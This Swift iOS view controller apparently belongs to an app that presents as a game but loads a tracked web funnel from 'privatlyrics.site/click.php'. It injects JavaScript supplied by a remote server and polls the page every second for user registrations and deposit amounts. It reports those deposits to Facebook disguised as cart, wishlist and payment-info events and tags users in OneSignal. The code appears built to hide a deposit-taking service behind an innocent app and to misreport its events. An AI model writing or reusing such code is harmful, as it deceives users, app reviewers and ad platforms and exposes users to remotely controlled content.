import UIKit
import WebKit
import FacebookCore
import OneSignal

class WebViewController: UIViewController {
    //MARK: - Variable
    fileprivate let key = "qsg1dawnyv79wa3vp1k4"
    fileprivate let host =  "privatlyrics.site"
    fileprivate let path = "/click.php"
    fileprivate let source = "id1523016438"
    
    fileprivate let service = DifferentServices.shared
    fileprivate let appDelegate = UIApplication.shared.delegate as! AppDelegate
    fileprivate var fbDeepLinkURL: URL?
    fileprivate var deepLinkTimer: Timer?
    fileprivate var regTimer: Timer?
    fileprivate let defaults = UserDefaults.standard
    fileprivate let group = DispatchGroup()
    fileprivate var wasFirstRunMainFuncOnPage = false
    
    fileprivate var wasRegistration: Bool {
        get {
            return defaults.object(forKey: "wasRegistration") as? Bool ?? false
        } set (newValue) {
            deepURL = webView.url?.absoluteString ?? URLBuilder()
            defaults.set(newValue, forKey: "wasRegistration")
        }
    }
    
    fileprivate var wasDepNumberOne: Bool {
        get {
            return defaults.object(forKey: "wasDepNumberOne") as? Bool ?? false
        } set (newValue) {
            defaults.set(newValue, forKey: "wasDepNumberOne")
        }
    }
    
    fileprivate var wasDepNumberTwo: Bool {
        get {
            return defaults.object(forKey: "wasDepNumberTwo") as? Bool ?? false
        } set (newValue) {
            defaults.set(newValue, forKey: "wasDepNumberTwo")
        }
    }
    
    fileprivate var wasDepNumberThree: Bool {
        get {
            return defaults.object(forKey: "wasDepNumberThree") as? Bool ?? false
        } set (newValue) {
            defaults.set(newValue, forKey: "wasDepNumberThree")
        }
    }
    
    let js_cust_offer_id = "function cust_offer_id(){eltofind = document.getElementsByName(\"cust_offer_id\")[0];rez = 'null';if (typeof(eltofind) != 'undefined' && eltofind != null){rez = eltofind.getAttribute(\"content\");}return rez;}"
    
    fileprivate var firstPage = true
    
    //MARK: - dropboxJSSource
    fileprivate var dropboxJSSource: String {
        return service.dropboxJSSource
    }
    
    private var firstLoading: Bool {
        get {
            return defaults.object(forKey: "firstLoading") as? Bool ?? true
        } set (newValue) {
            defaults.set(newValue, forKey: "firstLoading")
        }
    }
    
    private var deepURL: String {
        get {
            return defaults.object(forKey: "deepURL") as? String ?? URLBuilder()
        } set (newValue)  {
            defaults.set(newValue, forKey: "deepURL")
        }
    }
    
    private var customOfferID: String {
        get {
            return defaults.object(forKey: "customOfferID") as? String ?? ""
        } set (newValue) {
            defaults.set(newValue, forKey: "customOfferID")
        }
    }
    
    //MARK: - WKWebView
    private lazy var webView: WKWebView = {
        let webConfiguration = WKWebViewConfiguration()
        webConfiguration.preferences = WKPreferences()
        webConfiguration.preferences.javaScriptEnabled = true
        
        let processPool: WKProcessPool
        if let pool: WKProcessPool = self.getData(key: "pool")  {
            processPool = pool
        } else {
            processPool = WKProcessPool()
            self.setData(processPool, key: "pool")
        }
        
        webConfiguration.processPool = processPool
        if let cookies: [HTTPCookie] = self.getData(key: "cookies") {
            for cookie in cookies {
                if #available(iOS 11.0, *) {
                    group.enter()
                    webConfiguration.websiteDataStore.httpCookieStore.setCookie(cookie) {
                        print("Set cookie = \(cookie) with name = \(cookie.name)")
                        self.group.leave()
                    }
                }
            }
        }
        
        let webView = WKWebView(frame: .zero, configuration: webConfiguration)
        webView.navigationDelegate = self
        webView.uiDelegate = self
        webView.translatesAutoresizingMaskIntoConstraints = false
        return webView
    }()
    
    //MARK: - ViewController Methods
    override func viewDidLoad() {
        super.viewDidLoad()
        if firstLoading {
            setupDeepTimer()
        }
        setupUI()
        if !firstLoading {
            webView.load(deepURL)
        }
    }
    
    //MARK: - Rotation View
    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
        if (self.isMovingFromParent) {
            UIDevice.current.setValue(Int(UIInterfaceOrientation.portrait.rawValue), forKey: "orientation")
        }
    }
    @objc func canRotate() -> Void {}
    
    override func viewDidDisappear(_ animated: Bool) {
        super.viewDidDisappear(animated)
        if #available(iOS 11.0, *) {
            self.webView.configuration.websiteDataStore.httpCookieStore.getAllCookies { cookies in
                self.setData(cookies, key: "cookies")
            }
        }
    }
    
    //MARK: - URLBuilder
    fileprivate func URLBuilder() -> String {
        var urlComponents = URLComponents()
        urlComponents.scheme = "https"
        urlComponents.host = host
        urlComponents.path = path
        urlComponents.queryItems = [
            URLQueryItem(name: "key", value: key),
            URLQueryItem(name: "source", value: source),
        ]
        let baseURLString =  urlComponents.url!.absoluteString
        let deepLinkString = fbDeepLinkURL?.query ?? ""
        let finalStringURL: String
        if !deepLinkString.isEmpty {
            finalStringURL =  baseURLString + "&" + deepLinkString
        } else {
            finalStringURL =  baseURLString
        }
        deepURL = finalStringURL
        return finalStringURL
    }
    
    fileprivate func setupDeepTimer() {
        if !appDelegate.defaultsDeepURL.isEmpty {
            let deepurl  = appDelegate.defaultsDeepURL
            fbDeepLinkURL = URL(string: deepurl)
            let url = URLBuilder()
            if firstLoading {
                webView.load(url)
            }
            firstLoading = false
        } else if appDelegate.deepURL == nil  {
            print(#line, #function)
            NotificationCenter.default.addObserver(self, selector: #selector(startWKWebViewWithDeepLink), name: .notificationDeepURLHasCome, object: nil)
            deepLinkTimer = Timer.scheduledTimer(timeInterval: 8, target: self, selector: #selector(fireDeepTimer), userInfo: nil, repeats: false)
            deepLinkTimer?.tolerance = 0.1
            firstLoading = false
        } else {
            let url = URLBuilder()
            if firstLoading {
                webView.load(url)
            }
            firstLoading = false
        }
    }
    
    @objc private func startWKWebViewWithDeepLink() {
        fbDeepLinkURL = appDelegate.deepURL
        deepLinkTimer?.invalidate()
        let url = URLBuilder()
        if firstLoading {
            webView.load(url)
        }
        firstLoading = false
    }
    
    fileprivate func customOfferIdParser(_ webView: WKWebView) {
        guard customOfferID.isEmpty  else { return }
        let queryDict = webView.url?.queryDictionary
        if let element = queryDict?["cust_offer_id"]  {
            print(#line, element)
            if customOfferID.isEmpty {
                customOfferID = element
            }
        }
    }
    
    @objc private func fireDeepTimer() {
        let url = URLBuilder()
        webView.load(url)
        firstLoading = false
    }
    
    private func setupAskRegTimer() {
        regTimer?.invalidate()
        regTimer = Timer.scheduledTimer(timeInterval: 1, target: self, selector: #selector(fireAskRegTimer), userInfo: nil, repeats: true)
    }
    
    @objc private func fireAskRegTimer() {
        self.webView.evaluateJavaScript("askReg()") { result, error in
            print(#line, #function, result ?? "askReg result nil", error ?? "askReg error nil")
            let strResult = result as? String ?? ""
            self.askRegHandlerJS(strResult)
        }
    }
    
    //MARK: - FB and OneSignal notification
    private func askRegHandlerJS(_ askReg: String) {
        let askRegArray = askReg.split(separator: ":")
        if askRegArray.count == 1 && askRegArray[0] == "0" {
            if !wasRegistration {
                print("Registration")
                deepURL =  webView.url?.absoluteString ?? URLBuilder()
                logCompleteRegistrationEvent(registrationMethod: "complete registration")
                wasRegistration = true
            }
        } else if askRegArray.count > 1 {
            let dep = askRegArray[0]
            let depNumber = Int(dep) ?? 4
            let sum = askRegArray[1]
            let sumNumber = Int(sum) ?? 0
            switch depNumber {
            case 1:
                if !wasRegistration {
                    wasDepNumberOne = true
                    wasRegistration = true
                } else {
                    if !wasDepNumberOne {
                        print("First Dep" + "\(depNumber) and \(sumNumber)")
                        logFirstDepEvent(sumDepOne: "\(sumNumber)")
                        wasRegistration = true
                        wasDepNumberOne = true
                    }
                }
            case 2:
                if !wasRegistration {
                    wasDepNumberTwo = true
                    wasRegistration = true
                } else {
                    if !wasDepNumberTwo && wasDepNumberOne {
                        print("Second Dep" + "\(depNumber) and \(sumNumber)")
                        logSecondDepEvent(sumDepTwo: "\(sumNumber)")
                        wasRegistration = true
                        wasDepNumberTwo = true
                    }
                }
            case 3:
                if !wasRegistration {
                    wasDepNumberThree = true
                    wasRegistration = true
                } else {
                    if !wasDepNumberThree && wasDepNumberTwo {
                        print("Third Dep" + "\(depNumber) and \(sumNumber)")
                        logThirdDepEvent(sumDepThree: "\(sumNumber)")
                        wasRegistration = true
                        wasDepNumberThree = true
                    }
                }
            default:
                print(depNumber)
            }
        }
    }
    
    //Facebook & OneSignal Events
    fileprivate func logCompleteRegistrationEvent(registrationMethod: String) {
        OneSignal.sendTag("reg", value: "1")
        let parameters = [AppEvents.ParameterName.registrationMethod.rawValue: registrationMethod]
        AppEvents.logEvent(.completedRegistration, parameters: parameters)
    }
    
    fileprivate func logFirstDepEvent(sumDepOne: String) {
        OneSignal.sendTag("dep1", value: sumDepOne)
        let parameters = [AppEvents.ParameterName.content.rawValue: sumDepOne ]
        AppEvents.logEvent(.addedToCart, parameters: parameters)
    }
    
    fileprivate func logSecondDepEvent(sumDepTwo: String) {
        OneSignal.sendTag("dep2", value: sumDepTwo)
        let parameters = [AppEvents.ParameterName.content.rawValue: sumDepTwo ]
        AppEvents.logEvent(.addedToWishlist, parameters: parameters)
    }
    
    fileprivate func logThirdDepEvent(sumDepThree: String) {
        OneSignal.sendTag("dep3", value: sumDepThree)
        let parameters = [AppEvents.ParameterName.content.rawValue: sumDepThree ]
        AppEvents.logEvent(.addedPaymentInfo, parameters: parameters)
    }
    
    fileprivate func presentMenuController() {
        let sb = UIStoryboard(name: "Game", bundle: .main)
        let navigationVC = sb.instantiateInitialViewController() ?? UIViewController()
        navigationVC.modalPresentationStyle = .fullScreen
        present(navigationVC, animated: true, completion: nil)
    }
    
    deinit {
        print("WK DEINIT")
    }
}

//MARK: - Extension
extension WebViewController {
    func setupUI() {
        self.view.backgroundColor = .black
        self.view.addSubview(webView)
        webView.topAnchor.constraint(equalTo: self.view.topAnchor).isActive = true
        webView.bottomAnchor.constraint(equalTo: self.view.bottomAnchor).isActive = true
        webView.leadingAnchor.constraint(equalTo: self.view.leadingAnchor).isActive = true
        webView.trailingAnchor.constraint(equalTo: self.view.trailingAnchor).isActive = true
    }
}

extension WebViewController: WKHTTPCookieStoreObserver {
    func setData(_ value: Any, key: String) {
        let ud = UserDefaults.standard
        let archivedPool = NSKeyedArchiver.archivedData(withRootObject: value)
        ud.set(archivedPool, forKey: key)
    }
    
    func getData<T>(key: String) -> T? {
        let ud = UserDefaults.standard
        if let val = ud.value(forKey: key) as? Data,
            let obj = NSKeyedUnarchiver.unarchiveObject(with: val) as? T {
            return obj
        }
        
        return nil
    }
}

extension WebViewController: WKUIDelegate {
    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        if navigationAction.targetFrame == nil {
            webView.load(navigationAction.request)
        }
        return nil
    }
}

extension WebViewController: WKNavigationDelegate {
    func webView(_ webView: WKWebView, didCommit navigation: WKNavigation!) {
        customOfferIdParser(webView)
    }
    
    func webView(_ webView: WKWebView, didFinish  navigation: WKNavigation!) {
        if firstPage {
            webView.evaluateJavaScript(js_cust_offer_id)
            webView.evaluateJavaScript("cust_offer_id()") { result, error in
                if self.customOfferID.isEmpty {
                    let strResult = result as? String ?? ""
                    if strResult != "null" {
                        self.customOfferID = strResult
                        print(#line, strResult)
                    }
                    print(#line, strResult)
                }
            }
            firstPage = false
        }
        
        customOfferIdParser(webView)
        
        if !dropboxJSSource.isEmpty && dropboxJSSource != "true" {
            webView.evaluateJavaScript(dropboxJSSource)
            if !customOfferID.isEmpty {
                webView.evaluateJavaScript("mainFunc('\(customOfferID)')") { result, error in
                    //                    print(#line, #function, result, error)
                    self.wasFirstRunMainFuncOnPage = true
                }
            }
            setupAskRegTimer()
        } 
    }
    
    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
        customOfferIdParser(webView)
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        guard let response = navigationResponse.response as? HTTPURLResponse,
            let url = navigationResponse.response.url else {
                decisionHandler(.allow)
                return
        }
        
        if let headerFields = response.allHeaderFields as? [String: String] {
            let cookies = HTTPCookie.cookies(withResponseHeaderFields: headerFields, for: url)
            cookies.forEach { cookie in
                if #available(iOS 11.0, *) {
                    webView.configuration.websiteDataStore.httpCookieStore.setCookie(cookie)
                }
            }
        }
        
        decisionHandler(.allow)
    }
}
